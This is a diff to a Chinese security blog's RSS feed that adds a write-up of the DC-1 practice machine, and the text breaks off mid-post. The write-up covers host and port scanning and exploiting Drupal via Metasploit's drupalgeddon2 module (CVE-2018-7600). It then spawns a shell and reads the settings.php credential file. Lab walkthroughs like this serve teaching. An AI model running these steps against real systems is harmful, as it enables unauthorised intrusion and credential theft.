@@ -1,19 +1,899 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>鼎星安全</title>
+        <title>鼎新安全</title>
         <link>https://dxlaboratory.github.io/</link>
-        <description>Recent content on 鼎星安全</description>
+        <description>Recent content on 鼎新安全</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
-        <copyright>鼎星实验室</copyright>
+        <copyright>鼎新实验室</copyright>
         <lastBuildDate>Thu, 31 Oct 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://dxlaboratory.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>DC-2</title>
-        <link>https://dxlaboratory.github.io/p/test-chinese/</link>
+        <title>DC-1</title>
+        <link>https://dxlaboratory.github.io/p/test1-chinese/</link>
         <pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate>
         
-        <guid>https://dxlaboratory.github.io/p/test-chinese/</guid>
-        <description>&lt;img src="https://dxlaboratory.github.io/20241104083955.jpg" alt="Featured image of post DC-2" /&gt;&lt;h1 id=&#34;前言&#34;&gt;前言
+        <guid>https://dxlaboratory.github.io/p/test1-chinese/</guid>
+        <description>&lt;p&gt;+++&lt;/p&gt;
+&lt;h1 id=&#34;一信息收集&#34;&gt; 一.信息收集
+&lt;/h1&gt;&lt;h2 id=&#34;主机发现&#34;&gt;主机发现
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arp-scan -l
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/e111f783d1ea46b5a067cd959d39ead6.png&#34;
+	width=&#34;1128&#34;
+	height=&#34;285&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/e111f783d1ea46b5a067cd959d39ead6_hu5664945937923100166.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/e111f783d1ea46b5a067cd959d39ead6_hu17603787849804340998.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;395&#34;
+		data-flex-basis=&#34;949px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;发现主机&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;192.168.36.43
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;扫描目标ip开放端口&#34;&gt;扫描目标ip开放端口
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -p- 192.168.36.43
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;#-sV 扫描目标主机端口上运行的软件信息 #-p- 扫描全部端口0-65535&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/fbc98a132dcb4eaaa3a103cdd0ebc912.png&#34;
+	width=&#34;1172&#34;
+	height=&#34;432&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/fbc98a132dcb4eaaa3a103cdd0ebc912_hu14570505018952576058.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/fbc98a132dcb4eaaa3a103cdd0ebc912_hu8471845362508914401.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;271&#34;
+		data-flex-basis=&#34;651px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;访问80端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f0396ee695ba43bfaee61119e8461558.png&#34;
+	width=&#34;2189&#34;
+	height=&#34;1212&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f0396ee695ba43bfaee61119e8461558_hu3684524924363148936.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/f0396ee695ba43bfaee61119e8461558_hu8011964106906344834.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;180&#34;
+		data-flex-basis=&#34;433px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;获取信息&#34;&gt;获取信息
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/299a9d8cfe1a46abba56b2dc3ddd1820.png&#34;
+	width=&#34;2131&#34;
+	height=&#34;1072&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/299a9d8cfe1a46abba56b2dc3ddd1820_hu7604677178965251716.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/299a9d8cfe1a46abba56b2dc3ddd1820_hu8860553450272553445.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;198&#34;
+		data-flex-basis=&#34;477px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;可以利用kali中的自带工具whatqweb工具&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;whatweb -v 192.168.36.43
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f3fe7a00899c4b5f8e2984520eb3dc08.png&#34;
+	width=&#34;1441&#34;
+	height=&#34;367&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f3fe7a00899c4b5f8e2984520eb3dc08_hu2073859247924115825.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/f3fe7a00899c4b5f8e2984520eb3dc08_hu13019439150556423008.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;392&#34;
+		data-flex-basis=&#34;942px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;也可以上网查询其历史漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/1359f14a3fb0469595f615f1a96cc133.png&#34;
+	width=&#34;1947&#34;
+	height=&#34;1189&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/1359f14a3fb0469595f615f1a96cc133_hu11229250754773569096.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/1359f14a3fb0469595f615f1a96cc133_hu13879542650233690777.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;163&#34;
+		data-flex-basis=&#34;393px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h1 id=&#34;二漏洞利用&#34;&gt;二.漏洞利用
+&lt;/h1&gt;&lt;p&gt;Metasploit利用&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/43aa9f84f6bc458c804dee14725bbba7.png&#34;
+	width=&#34;817&#34;
+	height=&#34;566&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/43aa9f84f6bc458c804dee14725bbba7_hu3014726427450360231.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/43aa9f84f6bc458c804dee14725bbba7_hu16312082844713181849.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;144&#34;
+		data-flex-basis=&#34;346px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;查询模块&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;search drupal
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/80f2831d2a204b51a8a08f3a9a83cad5.png&#34;
+	width=&#34;1713&#34;
+	height=&#34;488&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/80f2831d2a204b51a8a08f3a9a83cad5_hu8405197348984619584.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/80f2831d2a204b51a8a08f3a9a83cad5_hu5213950796966186572.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;351&#34;
+		data-flex-basis=&#34;842px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;利用2018年的这个漏洞（远程代码执行）&lt;/p&gt;
+&lt;p&gt;漏洞编号：CVE-2018-7600&lt;/p&gt;
+&lt;p&gt;Drupal 6,7,8等多个子版本存在远程代码执行漏洞&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use exploit/unix/webapp/drupal_drupalgeddon2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/317dc054756f42c3a6ff84d6405a61b2.png&#34;
+	width=&#34;866&#34;
+	height=&#34;83&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/317dc054756f42c3a6ff84d6405a61b2_hu16204486899756675198.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/317dc054756f42c3a6ff84d6405a61b2_hu16832364908836164584.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1043&#34;
+		data-flex-basis=&#34;2504px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;然后&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set RHOSTS 192.168.36.43
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/068d3cfa0bdd408d8a6ed9091c0d0444.png&#34;
+	width=&#34;1296&#34;
+	height=&#34;255&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/068d3cfa0bdd408d8a6ed9091c0d0444_hu15536626466726892344.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/068d3cfa0bdd408d8a6ed9091c0d0444_hu1921276497201884386.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;508&#34;
+		data-flex-basis=&#34;1219px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;python进行交换式环境&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -c &amp;#34;import pty; pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/419717529f6f40efae484b7bd061618e.png&#34;
+	width=&#34;390&#34;
+	height=&#34;64&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/419717529f6f40efae484b7bd061618e_hu14030361695965352524.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/419717529f6f40efae484b7bd061618e_hu10108452869794766692.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;609&#34;
+		data-flex-basis=&#34;1462px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;h2 id=&#34;flag1&#34;&gt;flag1
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/a41511770eff4a4cb797720f7c3ed173.png&#34;
+	width=&#34;969&#34;
+	height=&#34;201&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/a41511770eff4a4cb797720f7c3ed173_hu18329530849911759171.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/a41511770eff4a4cb797720f7c3ed173_hu17418433253927265359.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;482&#34;
+		data-flex-basis=&#34;1157px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;查看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/ff73a799ff144ce9bbfc264aaf8d970c.png&#34;
+	width=&#34;649&#34;
+	height=&#34;92&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/ff73a799ff144ce9bbfc264aaf8d970c_hu17506564032484975943.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/ff73a799ff144ce9bbfc264aaf8d970c_hu15456988278849413416.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;705&#34;
+		data-flex-basis=&#34;1693px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;p&gt;意为每个好的 CMS 都需要一个配置文件 - 你也一样&lt;/p&gt;
+&lt;p&gt;查找类似的配置文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find ./ -name &amp;#34;set*&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/75e14f566a804f698d4d113d4e907811.png&#34;
+	width=&#34;563&#34;
+	height=&#34;78&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/75e14f566a804f698d4d113d4e907811_hu14633495847028707679.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/75e14f566a804f698d4d113d4e907811_hu4618988174780245560.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;721&#34;
+		data-flex-basis=&#34;1732px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;p&gt;查看里面内容&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat sites/default/settings.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/17d7d7218132493c8896076f003cb3b5.png&#34;
